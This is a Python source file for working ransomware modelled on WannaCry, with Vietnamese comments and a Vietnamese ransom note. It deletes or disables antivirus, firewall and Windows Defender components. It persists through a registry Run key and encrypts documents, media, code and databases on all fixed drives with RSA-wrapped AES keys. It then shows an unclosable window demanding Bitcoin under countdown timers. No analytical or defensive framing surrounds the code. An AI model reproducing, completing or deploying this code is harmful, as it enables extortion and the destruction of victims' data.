import hashlib
import os, ctypes, sys, base64, time, winreg, subprocess, psutil
import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
from PIL import Image, ImageTk
from threading import Thread
import os
import sys

def disable_antivirus():
    # Check if antivirus software is installed
    antivirus_software = ['McAfee', 'Norton', 'Kaspersky']
    for software in antivirus_software:
        path_to_file = f"C:\Program Files\{software}.exe"
        if os.path.exists(path_to_file):
            try:
                os.remove(path_to_file)
            except OSError as e:
                print(f"Failed to remove {path_to_file}: {e}")

    # Check if firewall is enabled
    if sys.platform == 'win32':
        path_to_firewall = "C:\\Windows\\system32\\wfwizmgr.exe"
        if os.path.exists(path_to_firewall):
            try:
                os.remove(path_to_firewall)
            except OSError as e:
                print(f"Failed to remove {path_to_file}: {e}")

    # Check if anti-virus software is running
    if sys.platform == 'win32':
        path_to_av = "C:\\ProgramData\\Microsoft\\Windows Defender"
        if os.path.exists(path_to_av):
            try:
                os.rmdir(path_to_av)
            except OSError as e:
                print(f"Failed to remove {path_to_av}: {e}")

    # Check if anti-virus software is running
    import subprocess
    if sys.platform == 'win32':
        try:
            subprocess.check_output(['taskkill.exe /f /im "windows defender"'])
        except subprocess.CalledProcessError as e:
            print(f"Failed to terminate Windows Defender: {e}")

disable_antivirus()


# --- THƯ VIỆN MÃ HÓA ---
try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP, AES
except ImportError:
    os.system(f'"{sys.executable}" -m pip install pycryptodome')
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP, AES

# --- CẤU HÌNH ---
UNLOCK_KEY = "PENTA123"
FILE_ANH = "a.png" 
# Thay chuỗi này bằng Public Key RSA-2048 thật của bạn
PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAum2Z1maf75aOKvOn/LFp
1f5UjKss0ADkX2c9hKYoPyiMVJ8MPLm7os+ANfRs5y4BKVE2mw+I8sxVSoJgbl20
p+KtwwJDW2i9HSKJltx0etuOY4uGHhuh+gXN2dHc9/N5mp1l7mLPqyl0iUI4K+DJ
+kpWhAGasyMotVQR+nnCrTjDEhZow0+qDM9VMuExJZuRw0y7+jtKJXePAiM0K6it
mZiP0Z7ylobsT8q2JxmrRTXej5yuN7KtART9jYsLrnuWxoE1BYQ4vN1ls1D1qEih
RoL6/094E8tr0meeLOMju+LIx2waNXgWBZTyhwN3n2sSaSiZjJm3j10oDEZwhjFz
HQIDAQAB
-----END PUBLIC KEY-----"""

# --- HÀM CAN THIỆP HỆ THỐNG ---
def bypass_defender():
    try:
        current_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
        subprocess.run(f'powershell.exe -Command "Add-MpPreference -ExclusionPath \'{current_dir}\'"', shell=True, capture_output=True)
        subprocess.run('powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
    except: pass

def kill_third_party_av():
    av_list = ["AvastUI.exe", "avgui.exe", "Nis.exe", "McUICnt.exe", "avpui.exe", "bdagent.exe", "smc.exe", "ui.exe"]
    while True:
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] in av_list: proc.kill()
        except: pass
        time.sleep(0.5)

def resource_path(relative_path):
    try: base_path = sys._MEIPASS  # pyright: ignore[reportAttributeAccessIssue]
    except: base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def add_to_startup():
    try:
        exe_path = os.path.realpath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemRuntimeService", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except: pass

def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "SystemRuntimeService")
        winreg.CloseKey(key)
    except: pass

def thiet_lap_hinh_nen_fit(path_anh):
    if not os.path.exists(path_anh): return
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "2")
        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(key)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path_anh, 3)
    except: pass

def khoi_phuc_background_mac_dinh():
    try:
        default_wall = r"C:\Windows\Web\Wallpaper\Windows\img0.jpg"
        if os.path.exists(default_wall):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, default_wall, 3)
    except: pass

# --- LOGIC MÃ HÓA (CHỈ CẦN PUBLIC KEY) ---
def thuc_thi_ma_hoa_rsa():
    try:
        recipient_key = RSA.import_key(PUBLIC_KEY_PEM)
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.pdf', '.odt', '.ods', '.odp',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.ai', '.raw', '.svg', '.ico',
            '.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm', '.mp3', '.wav', '.flac', '.aac', '.m4a',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.vhd', '.vmdk',
            '.py', '.java', '.c', '.cpp', '.cs', '.h', '.php', '.asp', '.aspx', '.html', '.css', '.js', '.json', '.xml', '.cmd' , '.bat',
            '.sql', '.db', '.sqlite', '.mdb', '.accdb', '.bak']

        thu_muc_cam = ['windows', '$recycle.bin', 'boot', 'system volume information', 'programdata']
        o_dias = [p.mountpoint for p in psutil.disk_partitions() if 'fixed' in p.opts]

        for o_dia in o_dias:
            for root, dirs, files in os.walk(o_dia):
                if any(x in root.lower() for x in thu_muc_cam): continue 
                for file in files:
                    if any(file.lower().endswith(ext) for ext in extensions):
                        file_path = os.path.join(root, file)
                        if "SystemRuntimeService" in file or file.endswith(".exe"): continue
                        try:
                            if os.path.getsize(file_path) > 50 * 1024 * 1024: continue
                            with open(file_path, "rb") as f: data = f.read()
                            if data.startswith(b"RSA_"): continue

                            session_key = os.urandom(16)
                            enc_session_key = cipher_rsa.encrypt(session_key)
                            cipher_aes = AES.new(session_key, AES.MODE_EAX)
                            ciphertext, tag = cipher_aes.encrypt_and_digest(data)

                            with open(file_path, "wb") as f_enc:
                                f_enc.write(b"RSA_")
                                f_enc.write(enc_session_key) 
                                f_enc.write(cipher_aes.nonce)
                                f_enc.write(tag) 
                                f_enc.write(ciphertext)
                        except: pass
    except: pass

# --- LOGIC GIẢI MÃ (NẠP PRIVATE KEY TỪ THAM SỐ) ---
def thuc_thi_giai_ma_rsa(private_key_content):
    try:
        private_key = RSA.import_key(private_key_content)
        cipher_rsa = PKCS1_OAEP.new(private_key)
        o_dias = [p.mountpoint for p in psutil.disk_partitions() if 'fixed' in p.opts]
        for o_dia in o_dias:
            for root, dirs, files in os.walk(o_dia):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            header = f.read(4)
                            if header != b"RSA_": continue
                            enc_session_key = f.read(256)
                            nonce = f.read(16)
                            tag = f.read(16)
                            ciphertext = f.read()
                        
                        session_key = cipher_rsa.decrypt(enc_session_key)
                        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce=nonce)
                        original_data = cipher_aes.decrypt_and_verify(ciphertext, tag)
                        with open(file_path, "wb") as f_dec: f_dec.write(original_data)
                    except: continue
        return True
    except: return False

# --- GIAO DIỆN ---
class WannaCryInterface:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Wana Decrypt0r 2.0")
        self.root.geometry("800x600")
        self.root.resizable(False, False)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="#841414")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None) 

        tk.Label(self.root, text="Ooops, your files have been encrypted!", 
                 fg="white", bg="#841414", font=("Segoe UI", 20, "bold")).pack(pady=10)

        main_frame = tk.Frame(self.root, bg="#841414")
        main_frame.pack(fill="both", expand=True, padx=15)

        left_pnl = tk.Frame(main_frame, bg="#841414", width=220)
        left_pnl.pack(side="left", fill="y", padx=5)

        path = resource_path(FILE_ANH)
        if os.path.exists(path):
            img = Image.open(path).resize((180, 180), Image.Resampling.LANCZOS)
            self.photo = ImageTk.PhotoImage(img)
            tk.Label(left_pnl, image=self.photo, bg="#841414").pack(pady=10)

        self.timer1 = self.create_timer_box(left_pnl, "Payment will be raised on")
        self.timer2 = self.create_timer_box(left_pnl, "Your files will be lost on")

        right_pnl = tk.Frame(main_frame, bg="white")
        right_pnl.pack(side="right", fill="both", expand=True, padx=5)
        
        self.txt = scrolledtext.ScrolledText(right_pnl, wrap=tk.WORD, font=("Segoe UI", 10))
        noidung = """
[+] Chuyện gì đã xảy ra với máy tính của tôi?
Các tệp quan trọng của bạn đã bị mã hóa. Nhiều tệp tài liệu, ảnh, video, cơ sở dữ liệu và các tệp khác của bạn không còn có thể truy cập được vì chúng đã bị mã hóa. Có lẽ bạn đang bận rộn tìm cách phục hồi các tệp của mình, nhưng đừng lãng phí thời gian. Không ai có thể phục hồi các tệp của bạn nếu không có dịch vụ giải mã của chúng tôi.

[+] Tôi có thể phục hồi các tệp của mình không?
Chắc chắn rồi. Chúng tôi đảm bảo rằng bạn có thể khôi phục tất cả các tệp của mình một cách an toàn và dễ dàng. Nhưng bạn không có đủ thời gian.
Bạn có thể giải mã miễn phí một số tệp để kiểm tra. Hãy thử ngay bằng cách nhấp vào <Decrypt>.
Nhưng nếu bạn muốn giải mã tất cả các tệp, bạn cần phải thanh toán. Bạn chỉ có 3 ngày để gửi khoản thanh toán. Sau đó, giá sẽ tăng gấp đôi. Ngoài ra, nếu bạn không thanh toán trong 7 ngày, bạn sẽ không thể khôi phục các tệp của mình mãi mãi.

[+] Tôi phải thanh toán như thế nào?
Việc thanh toán chỉ được chấp nhận bằng Bitcoin. Để biết thêm thông tin, hãy nhấp vào <About bitcoin>.
Vui lòng kiểm tra giá Bitcoin hiện tại và mua một ít bitcoin. 
Gửi số tiền chính xác được chỉ định trong cửa sổ này đến địa chỉ ví bên dưới.
Sau khi thanh toán, hãy nhấp vào <Check Payment>. Thời gian kiểm tra tốt nhất: 9:00 sáng - 11:00 sáng hàng ngày.

[+] Nếu bạn đã có key giải mã, làm thế nào để sử dụng nó?
1. Nhập mã UNLOCK_KEY vào ô bên dưới.
2. Hệ thống sẽ yêu cầu bạn chọn file 'private_key.pem'.
3. Nhấn Decrypt để khôi phục dữ liệu."""
        self.txt.insert(tk.INSERT, noidung)
        self.txt.config(state="disabled")
        self.txt.pack(fill="both", expand=True)

        footer = tk.Frame(self.root, bg="#841414")
        footer.pack(fill="x", pady=10)
        self.key_entry = tk.Entry(footer, width=35, font=("Arial", 12))
        self.key_entry.pack(side="left", padx=40)
        
        tk.Button(footer, text="Decrypt", command=self.handle_decrypt, width=15).pack(side="left")

        self.update_clock()
        self.root.mainloop()

    def create_timer_box(self, parent, title):
        box = tk.LabelFrame(parent, text=title, fg="yellow", bg="#841414")
        box.pack(fill="x", pady=5)
        lbl = tk.Label(box, text="00:00:00", fg="white", bg="#841414", font=("Courier", 14, "bold"))
        lbl.pack()
        return lbl

    def update_clock(self):
        t = time.strftime('%H:%M:%S')
        self.timer1.config(text=f"02:{t}"); self.timer2.config(text=f"06:{t}")
        self.root.after(1000, self.update_clock)

    def handle_decrypt(self):
        if self.key_entry.get() == UNLOCK_KEY:
            file_path = filedialog.askopenfilename(title="Chọn file Private Key (.pem)", filetypes=[("PEM files", "*.pem")])
            if not file_path: return

            with open(file_path, "rb") as f:
                private_key_content = f.read()

            self.key_entry.delete(0, tk.END)
            self.key_entry.insert(0, "PROCESSING...")
            self.key_entry.config(state="disabled")
            
            def run_decrypt():
                if thuc_thi_giai_ma_rsa(private_key_content):
                    messagebox.showinfo("Success", "Files decrypted successfully!")
                    khoi_phuc_background_mac_dinh()
                    remove_from_startup()
                    self.root.destroy()
                else:
                    messagebox.showerror("Error", "Decryption failed! Key file may be wrong.")
                    self.key_entry.config(state="normal")
            
            Thread(target=run_decrypt, daemon=True).start()
        else:
            messagebox.showerror("Error", "WRONG UNLOCK KEY!")

# --- KHỞI CHẠY ---
if __name__ == "__main__":
    bypass_defender()
    Thread(target=kill_third_party_av, daemon=True).start()
    thiet_lap_hinh_nen_fit(resource_path(FILE_ANH))
    add_to_startup()
    Thread(target=thuc_thi_ma_hoa_rsa, daemon=True).start()
    WannaCryInterface()